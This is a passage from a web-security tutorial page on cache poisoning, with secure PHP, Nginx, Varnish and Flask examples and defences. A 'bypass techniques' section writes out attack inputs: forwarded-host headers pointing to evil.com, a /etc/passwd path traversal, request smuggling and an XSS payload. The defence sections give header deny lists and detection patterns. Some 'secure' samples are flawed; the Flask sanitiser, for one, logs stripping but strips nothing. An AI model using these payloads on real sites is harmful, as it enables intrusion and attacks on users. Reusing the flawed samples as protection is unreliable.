    <span class="code-keyword">private</span> <span class="code-keyword">$allowed_schemes</span>;
    
    <span class="code-keyword">public function</span> <span class="code-function">__construct</span>() {
        <span class="code-comment">// Whitelist allowed CDN hosts</span>
        <span class="code-keyword">$this</span>->allowed_hosts = [
            <span class="code-string">'cdn.example.com'</span>,
            <span class="code-string">'assets.example.com'</span>,
            <span class="code-string">'static.example.com'</span>
        ];
        
        <span class="code-keyword">$this</span>->allowed_schemes = [<span class="code-string">'https'</span>];
    }
    
    <span class="code-keyword">public function</span> <span class="code-function">getAnalyticsScript</span>() {
        <span class="code-comment">// SECURE: Ignore X-Forwarded-Host, use hardcoded trusted host</span>
        <span class="code-keyword">$host</span> = <span class="code-string">'cdn.example.com'</span>;  <span class="code-comment">// Never from user input</span>
        
        <span class="code-comment">// Additional validation</span>
        <span class="code-keyword">if</span> (!<span class="code-function">in_array</span>(<span class="code-keyword">$host</span>, <span class="code-keyword">$this</span>->allowed_hosts, <span class="code-keyword">true</span>)) {
            <span class="code-keyword">throw</span> <span class="code-keyword">new</span> \SecurityException(<span class="code-string">"Invalid host configuration"</span>);
        }
        
        <span class="code-keyword">$host</span> = <span class="code-function">htmlspecialchars</span>(<span class="code-keyword">$host</span>, <span class="code-function">ENT_QUOTES</span>, <span class="code-string">'UTF-8'</span>);
        
        <span class="code-keyword">return</span> <span class="code-string">"&lt;script src='https://"</span> . <span class="code-keyword">$host</span> . <span class="code-string">"/analytics.js'&gt;&lt;/script&gt;"</span>;
    }
    
    <span class="code-keyword">public function</span> <span class="code-function">getApiEndpoint</span>() {
        <span class="code-comment">// SECURE: Scheme determined by server configuration, not headers</span>
        <span class="code-keyword">$is_https</span> = !<span class="code-function">empty</span>(<span class="code-keyword">$_SERVER</span>[<span class="code-string">'HTTPS'</span>]) 
                   && <span class="code-keyword">$_SERVER</span>[<span class="code-string">'HTTPS'</span>] !== <span class="code-string">'off'</span>;
        
        <span class="code-keyword">$scheme</span> = <span class="code-keyword">$is_https</span> ? <span class="code-string">'https'</span> : <span class="code-string">'http'</span>;
        
        <span class="code-comment">// Reject if not HTTPS in production</span>
        <span class="code-keyword">if</span> (<span class="code-keyword">$scheme</span> !== <span class="code-string">'https'</span> && <span class="code-function">getenv</span>(<span class="code-string">'ENV'</span>) === <span class="code-string">'production'</span>) {
            <span class="code-keyword">throw</span> <span class="code-keyword">new</span> \SecurityException(<span class="code-string">"HTTPS required"</span>);
        }
        
        <span class="code-keyword">return</span> [
            <span class="code-string">'endpoint'</span> => <span class="code-string">'https://api.example.com/v2'</span>,
            <span class="code-string">'auth_url'</span> => <span class="code-string">'https://auth.example.com/token'</span>
        ];
    }
    
    <span class="code-comment">// Cache-Control: Prevent caching of dynamic content</span>
    <span class="code-keyword">public function</span> <span class="code-function">setSecureCacheHeaders</span>() {
        <span class="code-function">header</span>(<span class="code-string">'Cache-Control: private, no-store, no-cache, must-revalidate'</span>);
        <span class="code-function">header</span>(<span class="code-string">'Vary: Accept-Encoding'</span>);  <span class="code-comment">// Minimal vary, no unkeyed headers</span>
    }
}
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Lab 2: Secure Cache Configuration (Nginx/Varnish)</h3>
        <p class="text-content">
          <strong>Vulnerability:</strong> Default cache configurations that don't include critical headers in the cache
          key.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">❌ Vulnerable Nginx Configuration</span></div>
          <pre><code><span class="code-comment"># DANGEROUS: Default proxy_cache_key doesn't include critical headers</span>
<span class="code-keyword">proxy_cache_path</span> /var/cache/nginx levels=1:2 keys_zone=my_cache:10m max_size=1g;

<span class="code-keyword">server</span> {
    <span class="code-keyword">location</span> / {
        <span class="code-comment"># Default key: $scheme$request_method$host$request_uri</span>
        <span class="code-comment"># X-Forwarded-* headers NOT in key but passed to origin!</span>
        <span class="code-keyword">proxy_cache</span> my_cache;
        <span class="code-keyword">proxy_pass</span> http://backend;
        
        <span class="code-comment"># DANGEROUS: Forwarding all headers unchecked</span>
        <span class="code-keyword">proxy_set_header</span> X-Forwarded-Host $http_x_forwarded_host;
        <span class="code-keyword">proxy_set_header</span> X-Forwarded-Scheme $http_x_forwarded_scheme;
    }
}</code></pre>
        </div>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">✅ Secure Nginx Configuration</span></div>
          <pre><code><span class="code-comment"># SECURE: Explicit cache key including critical headers OR strip them</span>
<span class="code-keyword">proxy_cache_path</span> /var/cache/nginx levels=1:2 keys_zone=secure_cache:10m max_size=1g;

<span class="code-comment"># Option 1: Include dangerous headers in cache key (if needed)</span>
<span class="code-keyword">map</span> $http_x_forwarded_host $cache_key_host {
    <span class="code-string">""</span>     $host;
    <span class="code-keyword">default</span> $http_x_forwarded_host;  <span class="code-comment"># Only if validated</span>
}

<span class="code-keyword">proxy_cache_key</span> <span class="code-string">"$scheme$request_method$cache_key_host$request_uri"</span>;

<span class="code-keyword">server</span> {
    <span class="code-keyword">location</span> / {
        <span class="code-keyword">proxy_cache</span> secure_cache;
        <span class="code-keyword">proxy_pass</span> http://backend;
        
        <span class="code-comment"># SECURE: Strip or validate X-Forwarded headers</span>
        <span class="code-keyword">proxy_set_header</span> X-Forwarded-Host <span class="code-string">""</span>;  <span class="code-comment"># Remove completely</span>
        <span class="code-keyword">proxy_set_header</span> X-Forwarded-Scheme <span class="code-string">""</span>;
        
        <span class="code-comment"># Only set trusted values from internal load balancer</span>
        <span class="code-keyword">proxy_set_header</span> X-Forwarded-Proto $scheme;
        <span class="code-keyword">proxy_set_header</span> X-Real-IP $remote_addr;
        
        <span class="code-comment"># Cache only idempotent methods</span>
        <span class="code-keyword">proxy_cache_methods</span> GET HEAD;
        
        <span class="code-comment"># Don't cache responses with Set-Cookie</span>
        <span class="code-keyword">proxy_hide_header</span> Set-Cookie;
        <span class="code-keyword">proxy_ignore_headers</span> Set-Cookie;
    }
    
    <span class="code-comment"># SECURE: Block direct access to origin</span>
    <span class="code-keyword">location</span> /internal/ {
        <span class="code-keyword">deny</span> all;
        <span class="code-keyword">return</span> 403;
    }
}</code></pre>
        </div>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">✅ Secure Varnish VCL</span></div>
          <pre><code><span class="code-keyword">vcl 4.1;</span>

<span class="code-keyword">import</span> std;

<span class="code-keyword">backend</span> default {
    <span class="code-keyword">.host</span> = <span class="code-string">"127.0.0.1"</span>;
    <span class="code-keyword">.port</span> = <span class="code-string">"8080"</span>;
}

<span class="code-keyword">sub</span> vcl_recv {
    <span class="code-comment"># SECURE: Normalize cache key - remove dangerous headers</span>
    <span class="code-keyword">unset</span> req.http.X-Forwarded-Host;
    <span class="code-keyword">unset</span> req.http.X-Forwarded-Scheme;
    <span class="code-keyword">unset</span> req.http.X-Http-Method-Override;
    
    <span class="code-comment"># Only accept X-Forwarded-Proto from trusted load balancer</span>
    <span class="code-keyword">if</span> (client.ip !~ trusted_lb) {
        <span class="code-keyword">unset</span> req.http.X-Forwarded-Proto;
    }
    
    <span class="code-comment"># Normalize Accept-Encoding to prevent cache bloat</span>
    <span class="code-keyword">if</span> (req.http.Accept-Encoding) {
        <span class="code-keyword">if</span> (req.url ~ <span class="code-string">"\.(jpg|png|gif|gz|tgz|bz2|tbz|mp3|mp4|ogg)$"</span>) {
            <span class="code-keyword">unset</span> req.http.Accept-Encoding;
        } <span class="code-keyword">elsif</span> (req.http.Accept-Encoding ~ <span class="code-string">"gzip"</span>) {
            <span class="code-keyword">set</span> req.http.Accept-Encoding = <span class="code-string">"gzip"</span>;
        } <span class="code-keyword">else</span> {
            <span class="code-keyword">unset</span> req.http.Accept-Encoding;
        }
    }
    
    <span class="code-comment"># Don't cache POST/PUT/DELETE</span>
    <span class="code-keyword">if</span> (req.method != <span class="code-string">"GET"</span> && req.method != <span class="code-string">"HEAD"</span>) {
        <span class="code-keyword">return</span> (pass);
    }
    
    <span class="code-comment"># SECURE: Hash key includes only safe components</span>
    <span class="code-keyword">hash_data</span>(req.url);
    <span class="code-keyword">hash_data</span>(req.http.host);
    
    <span class="code-comment"># Don't cache requests with cookies (unless static assets)</span>
    <span class="code-keyword">if</span> (req.http.Cookie && req.url !~ <span class="code-string">"\.(css|js|png|jpg|jpeg|gif|ico|svg|woff|woff2)$"</span>) {
        <span class="code-keyword">return</span> (pass);
    }
}

<span class="code-keyword">sub</span> vcl_backend_response {
    <span class="code-comment"># Don't cache if origin sends Vary: * (cache-busting)</span>
    <span class="code-keyword">if</span> (beresp.http.Vary == <span class="code-string">"*"</span>) {
        <span class="code-keyword">set</span> beresp.uncacheable = true;
        <span class="code-keyword">return</span> (deliver);
    }
    
    <span class="code-comment"># Limit cache duration for dynamic content</span>
    <span class="code-keyword">if</span> (bereq.url ~ <span class="code-string">"^/api/"</span>) {
        <span class="code-keyword">set</span> beresp.ttl = 30s;
        <span class="code-keyword">set</span> beresp.grace = 15s;
    }
}</code></pre>
        </div>

        <h3 class="subsection-title">Lab 3: Python/Flask Secure Headers</h3>
        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">✅ Python Flask Implementation</span></div>
          <pre><code><span class="code-keyword">from</span> flask <span class="code-keyword">import</span> Flask, request, abort
<span class="code-keyword">from</span> functools <span class="code-keyword">import</span> wraps
<span class="code-keyword">import</span> re

app = Flask(__name__)

<span class="code-keyword">class</span> <span class="code-function">CachePoisoningProtection</span>:
    <span class="code-function">DANGEROUS_HEADERS</span> = [
        <span class="code-string">'X-Forwarded-Host'</span>,
        <span class="code-string">'X-Forwarded-Scheme'</span>,
        <span class="code-string">'X-Http-Method-Override'</span>,
        <span class="code-string">'X-Forwarded-Server'</span>,
        <span class="code-string">'X-HTTP-Host-Override'</span>,
        <span class="code-string">'Forwarded'</span>
    ]
    
    <span class="code-function">HOST_WHITELIST</span> = [
        <span class="code-string">'example.com'</span>,
        <span class="code-string">'www.example.com'</span>,
        <span class="code-string">'api.example.com'</span>
    ]
    
    <span class="code-keyword">@classmethod</span>
    <span class="code-keyword">def</span> <span class="code-function">sanitize_request</span>(cls):
        <span class="code-string">"""Remove or validate dangerous headers before processing"""</span>
        
        <span class="code-comment"># Check for presence of dangerous headers</span>
        <span class="code-keyword">for</span> header <span class="code-keyword">in</span> cls.DANGEROUS_HEADERS:
            <span class="code-keyword">if</span> header <span class="code-keyword">in</span> request.headers:
                <span class="code-comment"># Option 1: Reject request entirely</span>
                <span class="code-comment"># abort(400, f"Header {header} not allowed")</span>
                
                <span class="code-comment"># Option 2: Log and ignore</span>
                app.logger.warning(<span class="code-string">f"Stripping dangerous header: {header}"</span>)
        
        <span class="code-comment"># Validate Host header</span>
        host = request.headers.<span class="code-function">get</span>(<span class="code-string">'Host'</span>, <span class="code-string">''</span>).<span class="code-function">split</span>(<span class="code-string">':'</span>)[<span class="code-number">0</span>]
        <span class="code-keyword">if</span> host <span class="code-keyword">not in</span> cls.HOST_WHITELIST:
            abort(<span class="code-number">400</span>, <span class="code-string">"Invalid Host header"</span>)
    
    <span class="code-keyword">@classmethod</span>
    <span class="code-keyword">def</span> <span class="code-function">get_safe_scheme</span>(cls):
        <span class="code-string">"""Determine scheme from server environment only"""</span>
        <span class="code-keyword">return</span> <span class="code-string">'https'</span> <span class="code-keyword">if</span> request.is_secure <span class="code-keyword">else</span> <span class="code-string">'http'</span>
    
    <span class="code-keyword">@classmethod</span>
    <span class="code-keyword">def</span> <span class="code-function">get_safe_host</span>(cls):
        <span class="code-string">"""Return trusted host, never from X-Forwarded headers"""</span>
        <span class="code-keyword">return</span> <span class="code-string">'example.com'</span>  <span class="code-comment"># Hardcoded or from config</span>

<span class="code-keyword">def</span> <span class="code-function">require_no_cache</span>(f):
    <span class="code-string">"""Decorator to prevent caching of dynamic endpoints"""</span>
    <span class="code-keyword">@wraps</span>(f)
    <span class="code-keyword">def</span> <span class="code-function">decorated</span>(*args, **kwargs):
        response = <span class="code-function">f</span>(*args, **kwargs)
        response.headers[<span class="code-string">'Cache-Control'</span>] = <span class="code-string">'private, no-store, no-cache, must-revalidate'</span>
        response.headers[<span class="code-string">'Pragma'</span>] = <span class="code-string">'no-cache'</span>
        response.headers[<span class="code-string">'Expires'</span>] = <span class="code-string">'0'</span>
        <span class="code-keyword">return</span> response
    <span class="code-keyword">return</span> decorated

<span class="code-keyword">@app.route</span>(<span class="code-string">'/api/config'</span>)
<span class="code-keyword">@require_no_cache</span>
<span class="code-keyword">def</span> <span class="code-function">api_config</span>():
    CachePoisoningProtection.<span class="code-function">sanitize_request</span>()
    
    <span class="code-keyword">return</span> {
        <span class="code-string">'endpoint'</span>: <span class="code-string">f"https://api.example.com/v2"</span>,
        <span class="code-string">'cdn'</span>: <span class="code-string">"https://cdn.example.com"</span>,
        <span class="code-string">'scheme'</span>: CachePoisoningProtection.<span class="code-function">get_safe_scheme</span>()
    }

<span class="code-keyword">@app.route</span>(<span class="code-string">'/dashboard'</span>)
<span class="code-keyword">@require_no_cache</span>
<span class="code-keyword">def</span> <span class="code-function">dashboard</span>():
    CachePoisoningProtection.<span class="code-function">sanitize_request</span>()
    
    <span class="code-comment"># Never use user-controlled headers in output</span>
    cdn_host = <span class="code-string">'cdn.example.com'</span>
    
    <span class="code-keyword">return</span> <span class="code-string">f"""
    &lt;html&gt;
        &lt;head&gt;
            &lt;script src="https://{cdn_host}/analytics.js"&gt;&lt;/script&gt;
        &lt;/head&gt;
    &lt;/html&gt;
    """</span>

<span class="code-keyword">if</span> __name__ == <span class="code-string">'__main__'</span>:
    app.run()</code></pre>
        </div>
      </div>

      <div id="bypass" class="content-card">
        <h2 class="card-title"><i>🚧</i> Cache Poisoning Bypass Techniques</h2>

        <p class="text-content">
          Attackers employ sophisticated techniques to bypass cache protections, WAFs, and input validation.
          Understanding these methods is crucial for building robust defenses.
        </p>

        <h3 class="subsection-title">1. Header Name Variations</h3>
        <p class="text-content">
          Caches and origin servers may parse headers differently. Case variations, spacing, and encoding can bypass
          filters.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Header Normalization Bypasses</span></div>
          <pre><code><span class="code-comment">-- Case variations (some servers normalize, others don't)</span>
<span class="code-attr">x-forwarded-host</span>: <span class="code-string">evil.com</span>
<span class="code-attr">X-FORWARDED-HOST</span>: <span class="code-string">evil.com</span>
<span class="code-attr">X_Forwarded_Host</span>: <span class="code-string">evil.com</span>

<span class="code-comment">-- Spacing variations</span>
<span class="code-attr">X-Forwarded-Host </span>: <span class="code-string">evil.com</span>  <span class="code-comment">(space before colon)</span>
<span class="code-attr">X-Forwarded-Host</span>: <span class="code-string"> evil.com</span>  <span class="code-comment">(leading space in value)</span>

<span class="code-comment">-- Duplicate headers (some frameworks concatenate)</span>
<span class="code-attr">X-Forwarded-Host</span>: <span class="code-string">legit.com</span>
<span class="code-attr">X-Forwarded-Host</span>: <span class="code-string">evil.com</span>

<span class="code-comment">-- Alternative header names</span>
<span class="code-attr">X-Proxy-Host</span>: <span class="code-string">evil.com</span>
<span class="code-attr">X-Real-Host</span>: <span class="code-string">evil.com</span>
<span class="code-attr">X-Originating-Host</span>: <span class="code-string">evil.com</span>
<span class="code-attr">X-DNS-Prefetch-Control</span>: <span class="code-string">evil.com</span>
<span class="code-attr">Forwarded</span>: <span class="code-string">host=evil.com</span>  <span class="code-comment">-- RFC 7239</span></code></pre>
        </div>

        <h3 class="subsection-title">2. Cache Key Injection</h3>
        <p class="text-content">
          Some caches include query parameters in keys but normalize them differently than the origin server.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Query Parameter Manipulation</span></div>
          <pre><code><span class="code-comment">-- Parameter pollution (cache sees different key than origin)</span>
<span class="code-string">?id=1&id=2</span>  <span class="code-comment">-- Cache: key="id=1&id=2", Origin: uses last value (id=2)</span>

<span class="code-comment">-- Encoding differences</span>
<span class="code-string">?redirect=%68%74%74%70%3a%2f%2f%65%76%69%6c%2e%63%6f%6d</span>  <span class="code-comment">-- URL-encoded</span>
<span class="code-string">?redirect=http://evil.com</span>  <span class="code-comment">-- Cache may store separately</span>

<span class="code-comment">-- Path traversal in query</span>
<span class="code-string">?file=../../../etc/passwd</span>
<span class="code-string">?file=....//....//....//etc/passwd</span>

<span class="code-comment">-- Null byte injection (legacy systems)</span>
<span class="code-string">?page=index%00.js</span>  <span class="code-comment">-- May bypass extension checks</span>

<span class="code-comment">-- Unicode normalization</span>
<span class="code-string">?host=ｅｖｉｌ．ｃｏｍ</span>  <span class="code-comment">-- Fullwidth characters</span></code></pre>
        </div>

        <h3 class="subsection-title">3. HTTP Smuggling + Cache Poisoning</h3>
        <p class="text-content">
          Combining HTTP Request Smuggling with cache poisoning creates powerful attacks that bypass front-end security
          controls.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Smuggling-Assisted Poisoning</span></div>
          <pre><code><span class="code-comment">-- Front-end cache sees Request 1, back-end sees Request 2</span>

<span class="code-comment">-- Attacker sends smuggled request:</span>
<span class="code-keyword">POST</span> <span class="code-string">/ HTTP/1.1</span>
<span class="code-attr">Host</span>: <span class="code-string">example.com</span>
<span class="code-attr">Content-Length</span>: <span class="code-number">64</span>
<span class="code-attr">Transfer-Encoding</span>: <span class="code-string">chunked</span>

<span class="code-number">0</span>

<span class="code-keyword">GET</span> <span class="code-string">/dashboard</span> <span class="code-keyword">HTTP/1.1</span>
<span class="code-attr">X-Forwarded-Host</span>: <span class="code-string">evil.com</span>
<span class="code-attr">Foo</span>: <span class="code-string">x</span>

<span class="code-comment">-- Front-end processes POST, caches nothing (or wrong thing)</span>
<span class="code-comment">-- Back-end sees second GET with X-Forwarded-Host</span>
<span class="code-comment">-- Response with evil.com gets cached under /dashboard key!</span></code></pre>
        </div>

        <h3 class="subsection-title">4. Vary Header Abuse</h3>
        <p class="text-content">
          The <code>Vary</code> response header tells caches which request headers to include in their cache key.
          Misconfigured Vary headers can create cache poisoning opportunities.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Vary Header Exploitation</span></div>
          <pre><code><span class="code-comment">-- If origin sends: Vary: Origin</span>
<span class="code-comment">-- Cache includes Origin header in key</span>

<span class="code-comment">-- But if origin also reflects Origin without validation:</span>
<span class="code-keyword">GET</span> <span class="code-string">/api/data</span> <span class="code-keyword">HTTP/1.1</span>
<span class="code-attr">Origin</span>: <span class="code-string">https://evil.com</span>

<span class="code-comment">-- Response:</span>
<span class="code-keyword">HTTP/1.1</span> <span class="code-number">200</span> OK
<span class="code-attr">Access-Control-Allow-Origin</span>: <span class="code-string">https://evil.com</span>
<span class="code-attr">Vary</span>: <span class="code-string">Origin</span>

<span class="code-comment">-- This is actually CORRECT behavior for CORS</span>
<span class="code-comment">-- But if combined with other reflections:</span>
<span class="code-attr">Access-Control-Allow-Origin</span>: <span class="code-string">*</span>  <span class="code-comment">-- Wildcard + credentials = vulnerability</span>

<span class="code-comment">-- Or if Vary is missing:</span>
<span class="code-comment">-- Cache stores CORS headers for all users!</span></code></pre>
        </div>

        <h3 class="subsection-title">5. Fat GET / Body Injection</h3>
        <p class="text-content">
          Some caches ignore GET body content in the cache key, but origin servers may process it.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Fat GET Exploitation</span></div>
          <pre><code><span class="code-comment">-- Cache key: GET example.com /search?q=popular</span>
<span class="code-comment">-- But origin reads POST body instead of query string!</span>

<span class="code-keyword">GET</span> <span class="code-string">/search?q=popular</span> <span class="code-keyword">HTTP/1.1</span>
<span class="code-attr">Host</span>: <span class="code-string">example.com</span>
<span class="code-attr">Content-Type</span>: <span class="code-string">application/x-www-form-urlencoded</span>
<span class="code-attr">Content-Length</span>: <span class="code-number">27</span>

<span class="code-string">q=&lt;script&gt;alert(1)&lt;/script&gt;</span>

<span class="code-comment">-- Cache stores response under "q=popular" key</span>
<span class="code-comment">-- But response contains XSS payload from body!</span>
<span class="code-comment">-- Victims searching "popular" get XSS</span>

<span class="code-comment">-- Alternative: JSON body in GET</span>
<span class="code-keyword">GET</span> <span class="code-string">/api/config</span> <span class="code-keyword">HTTP/1.1</span>
<span class="code-attr">Content-Type</span>: <span class="code-string">application/json</span>

{<span class="code-attr">"api_endpoint"</span>: <span class="code-string">"http://evil.com"</span>}</code></pre>
        </div>
      </div>

      <div id="mitigation" class="content-card">
        <h2 class="card-title"><i>🛡️</i> Cache Poisoning Prevention Checklist: Defense in Depth</h2>

        <div class="highlight-box">
          <strong>Golden Rule:</strong> Never trust headers that can be set by clients. Strip or validate all
          <code>X-Forwarded-*</code> headers at the edge, and never use them in response generation unless explicitly
          required and strictly validated against a whitelist.
        </div>

        <h3 class="subsection-title">Layer 1: Strip Dangerous Headers at Edge</h3>
        <p class="text-content">
          The most effective defense is removing dangerous headers before they reach your application.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Edge Header Stripping</span></div>
          <pre><code><span class="code-comment">-- Cloudflare Transform Rules</span>
<span class="code-keyword">(http.request.headers.names[*] contains "x-forwarded-host")</span>
<span class="code-keyword">or</span> <span class="code-keyword">(http.request.headers.names[*] contains "x-forwarded-scheme")</span>
<span class="code-keyword">or</span> <span class="code-keyword">(http.request.headers.names[*] contains "x-http-method-override")</span>
<span class="code-comment">-- Action: Remove header</span>

<span class="code-comment">-- AWS WAF Rule</span>
{
    <span class="code-attr">"Name"</span>: <span class="code-string">"StripDangerousHeaders"</span>,
    <span class="code-attr">"Priority"</span>: <span class="code-number">0</span>,
    <span class="code-attr">"Statement"</span>: {
        <span class="code-attr">"OrStatement"</span>: {
            <span class="code-attr">"Statements"</span>: [
                {
                    <span class="code-attr">"ByteMatchStatement"</span>: {
                        <span class="code-attr">"SearchString"</span>: <span class="code-string">"x-forwarded-host"</span>,
                        <span class="code-attr">"FieldToMatch"</span>: { <span class="code-attr">"SingleHeader"</span>: { <span class="code-attr">"Name"</span>: <span class="code-string">"x-forwarded-host"</span> }},
                        <span class="code-attr">"TextTransformations"</span>: [{<span class="code-attr">"Priority"</span>: <span class="code-number">0</span>, <span class="code-attr">"Type"</span>: <span class="code-string">"LOWERCASE"</span>}],
                        <span class="code-attr">"PositionalConstraint"</span>: <span class="code-string">"EXACTLY"</span>
                    }
                }
            ]
        }
    },
    <span class="code-attr">"Action"</span>: { <span class="code-attr">"Block"</span>: {} }
}

<span class="code-comment">-- Akamai Property Manager</span>
<span class="code-comment">-- Add "Modify Incoming Request Header" behavior</span>
<span class="code-comment">-- Action: Delete X-Forwarded-Host, X-Forwarded-Scheme</span></code></pre>
        </div>

        <h3 class="subsection-title">Layer 2: Application-Level Validation</h3>
        <p class="text-content">
          If headers must be used, validate them rigorously against strict allowlists.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Strict Header Validation</span></div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-keyword">class</span> <span class="code-function">HeaderValidator</span> {
    <span class="code-keyword">const</span> <span class="code-function">ALLOWED_HOSTS</span> = [<span class="code-string">'example.com'</span>, <span class="code-string">'www.example.com'</span>, <span class="code-string">'api.example.com'</span>];
    <span class="code-keyword">const</span> <span class="code-function">ALLOWED_SCHEMES</span> = [<span class="code-string">'https'</span>];
    
    <span class="code-keyword">public static function</span> <span class="code-function">validateHost</span>(<span class="code-keyword">$host</span>) {
        <span class="code-keyword">if</span> (!<span class="code-function">is_string</span>(<span class="code-keyword">$host</span>)) {
            <span class="code-keyword">return</span> <span class="code-keyword">false</span>;
        }
        
        <span class="code-comment">// Remove port if present</span>
        <span class="code-keyword">$host</span> = <span class="code-function">explode</span>(<span class="code-string">':'</span>, <span class="code-keyword">$host</span>)[<span class="code-number">0</span>];
        
        <span class="code-comment">// Strict allowlist check</span>
        <span class="code-keyword">return</span> <span class="code-function">in_array</span>(<span class="code-keyword">$host</span>, self::ALLOWED_HOSTS, <span class="code-keyword">true</span>);
    }
    
    <span class="code-keyword">public static function</span> <span class="code-function">getTrustedHost</span>() {
        <span class="code-comment">// NEVER use X-Forwarded-Host from client</span>
        <span class="code-comment">// Use server-configured value or Host header with validation</span>
        
        <span class="code-keyword">$host</span> = <span class="code-keyword">$_SERVER</span>[<span class="code-string">'HTTP_HOST'</span>] ?? <span class="code-string">'example.com'</span>;
        
        <span class="code-keyword">if</span> (!self::<span class="code-function">validateHost</span>(<span class="code-keyword">$host</span>)) {
            <span class="code-keyword">throw</span> <span class="code-keyword">new</span> \SecurityException(<span class="code-string">"Invalid host"</span>);
        }
        
        <span class="code-keyword">return</span> <span class="code-keyword">$host</span>;
    }
    
    <span class="code-keyword">public static function</span> <span class="code-function">getTrustedScheme</span>() {
        <span class="code-comment">// Determine from server environment only</span>
        <span class="code-keyword">$is_https</span> = !<span class="code-function">empty</span>(<span class="code-keyword">$_SERVER</span>[<span class="code-string">'HTTPS'</span>]) 
                   && <span class="code-keyword">$_SERVER</span>[<span class="code-string">'HTTPS'</span>] !== <span class="code-string">'off'</span>;
        
        <span class="code-keyword">return</span> <span class="code-keyword">$is_https</span> ? <span class="code-string">'https'</span> : <span class="code-string">'http'</span>;
    }
}
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Layer 3: Cache Configuration Hardening</h3>
        <p class="text-content">
          Configure caches to prevent poisoning by normalizing keys and limiting cacheability.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Cache Hardening Rules</span></div>
          <pre><code><span class="code-comment">-- Varnish: Normalize cache key</span>
<span class="code-keyword">sub</span> vcl_hash {
    <span class="code-comment"># Include normalized host (lowercase, no port)</span>
    <span class="code-keyword">hash_data</span>(<span class="code-function">regsub</span>(req.http.host, <span class="code-string">":.*$"</span>, <span class="code-string">""</span>));
    
    <span class="code-comment"># Include full URL with query string</span>
    <span class="code-keyword">hash_data</span>(req.url);
    
    <span class="code-comment"># If you MUST vary by header, normalize it first</span>
    <span class="code-keyword">if</span> (req.http.Accept-Language) {
        <span class="code-keyword">hash_data</span>(<span class="code-function">regsub</span>(req.http.Accept-Language, <span class="code-string">"^([a-z]{2}).*$"</span>, <span class="code-string">"\1"</span>));
    }
}

<span class="code-comment">-- Nginx: Cache key with validation</span>
<span class="code-keyword">map</span> $http_accept_encoding $normalized_encoding {
    <span class="code-string">"~*gzip"</span>  <span class="code-string">"gzip"</span>;
    <span class="code-keyword">default</span>   <span class="code-string">""</span>;
}

<span class="code-keyword">proxy_cache_key</span> <span class="code-string">"$scheme$request_method$host$request_uri$normalized_encoding"</span>;

<span class="code-comment">-- CloudFront Cache Policy</span>
<span class="code-comment">-- Headers: Include only necessary headers in cache key</span>
<span class="code-comment">-- Query strings: Whitelist only required parameters</span>
<span class="code-comment">-- Cookies: Don't forward unless necessary</span></code></pre>
        </div>

        <h3 class="subsection-title">Layer 4: Response Cache-Control</h3>
        <p class="text-content">
          Use explicit Cache-Control headers to prevent caching of dynamic or sensitive content.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Secure Cache-Control Headers</span></div>
          <pre><code><span class="code-comment">-- Never cache dynamic content that includes user-specific data</span>
<span class="code-keyword">Cache-Control</span>: <span class="code-string">private, no-store, no-cache, must-revalidate, proxy-revalidate</span>
<span class="code-keyword">Pragma</span>: <span class="code-string">no-cache</span>
<span class="code-keyword">Expires</span>: <span class="code-string">0</span>

<span class="code-comment">-- For semi-static content (careful!)</span>
<span class="code-keyword">Cache-Control</span>: <span class="code-string">public, max-age=3600, s-maxage=3600</span>
<span class="code-keyword">Vary</span>: <span class="code-string">Accept-Encoding</span>  <span class="code-comment">-- Only vary by safe headers</span>

<span class="code-comment">-- If content varies by user (but don't vary by unsafe headers!)</span>
<span class="code-keyword">Cache-Control</span>: <span class="code-string">private, max-age=0</span>
<span class="code-comment">-- Never: Vary: Origin, X-Forwarded-Host, etc.</span>

<span class="code-comment">-- PHP implementation</span>
<span class="code-keyword">header</span>(<span class="code-string">'Cache-Control: private, no-store, no-cache, must-revalidate'</span>);
<span class="code-keyword">header</span>(<span class="code-string">'Pragma: no-cache'</span>);
<span class="code-keyword">header</span>(<span class="code-string">'Expires: Thu, 19 Nov 1981 08:52:00 GMT'</span>);  <span class="code-comment">-- Past date</span></code></pre>
        </div>

        <h3 class="subsection-title">Layer 5: Monitoring and Detection</h3>
        <p class="text-content">
          Implement monitoring to detect cache poisoning attempts in real-time.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Cache Poisoning Detection</span></div>
          <pre><code><span class="code-keyword">class</span> <span class="code-function">CachePoisoningDetector</span> {
    <span class="code-function">SUSPICIOUS_PATTERNS</span> = [
        <span class="code-string">r'&lt;script[^&gt;]*&gt;'</span>,
        <span class="code-string">r'javascript:'</span>,
        <span class="code-string">r'on\w+\s*='</span>,
        <span class="code-string">r'data:text/html'</span>,
        <span class="code-string">r'eval\s*\('</span>,
    ];
    
    <span class="code-function">DANGEROUS_HEADERS</span> = [
        <span class="code-string">'x-forwarded-host'</span>,
        <span class="code-string">'x-forwarded-scheme'</span>,
        <span class="code-string">'x-http-method-override'</span>,
    ];
    
    <span class="code-keyword">def</span> <span class="code-function">analyze_request</span>(self, request):
        alerts = []
        
        <span class="code-comment"># Check for dangerous headers</span>
        <span class="code-keyword">for</span> header <span class="code-keyword">in</span> self.DANGEROUS_HEADERS:
            <span class="code-keyword">if</span> header <span class="code-keyword">in</span> request.headers:
                alerts.append({
                    <span class="code-string">'type'</span>: <span class="code-string">'dangerous_header'</span>,
                    <span class="code-string">'header'</span>: header,
                    <span class="code-string">'value'</span>: request.headers[header],
                    <span class="code-string">'severity'</span>: <span class="code-string">'high'</span>
                })
        
        <span class="code-keyword">return</span> alerts
    
    <span class="code-keyword">def</span> <span class="code-function">analyze_response</span>(self, response, request):
